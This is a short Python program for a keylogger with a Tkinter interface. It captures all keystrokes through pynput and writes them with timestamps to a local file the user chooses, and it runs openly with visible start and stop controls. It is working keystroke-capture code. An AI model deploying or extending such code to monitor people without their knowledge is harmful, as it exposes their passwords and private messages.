from pynput import keyboard
from datetime import datetime
import threading
import tkinter as tk
from tkinter import filedialog, messagebox

class Keylogger:
    def __init__(self):
        self.listener = None
        self.running = False
        self.log_file_path = None
        self.setup_gui()

    def on_press(self, key):
        try:
            with open(self.log_file_path, "a") as log_file:
                log_file.write(f'{datetime.now()} - {key.char}\n')
        except AttributeError:
            with open(self.log_file_path, "a") as log_file:
                if key == keyboard.Key.space:
                    log_file.write(f'{datetime.now()} - [SPACE]\n')
                elif key == keyboard.Key.enter:
                    log_file.write(f'{datetime.now()} - [ENTER]\n')
                elif key == keyboard.Key.tab:
                    log_file.write(f'{datetime.now()} - [TAB]\n')
                elif key == keyboard.Key.backspace:
                    log_file.write(f'{datetime.now()} - [BACKSPACE]\n')
                elif key == keyboard.Key.esc:
                    log_file.write(f'{datetime.now()} - [ESC]\n')
                else:
                    log_file.write(f'{datetime.now()} - [{key}]\n')

    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.stop_keylogger()

    def start_keylogger(self):
        if not self.running and self.log_file_path:
            self.running = True
            self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
            self.listener.start()
            self.status_label.config(text="Keylogger is running...")
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
        else:
            messagebox.showwarning("Warning", "Please select a log file before starting the keylogger.")

    def stop_keylogger(self):
        if self.running:
            self.running = False
            if self.listener is not None:
                self.listener.stop()
                self.listener = None
            self.status_label.config(text="Keylogger stopped.")
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)

    def select_log_file(self):
        self.log_file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if self.log_file_path:
            self.file_label.config(text=f"Log File: {self.log_file_path}")

    def setup_gui(self):
        self.root = tk.Tk()
        self.root.title("Keylogger")

        self.status_label = tk.Label(self.root, text="Keylogger is not running.")
        self.status_label.pack(pady=10)

        self.file_button = tk.Button(self.root, text="Select Log File", command=self.select_log_file)
        self.file_button.pack(pady=5)

        self.file_label = tk.Label(self.root, text="No file selected.")
        self.file_label.pack(pady=5)

        self.start_button = tk.Button(self.root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(self.root, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.mainloop()

    def on_closing(self):
        self.stop_keylogger()
        self.root.destroy()

if __name__ == '__main__':
    Keylogger()
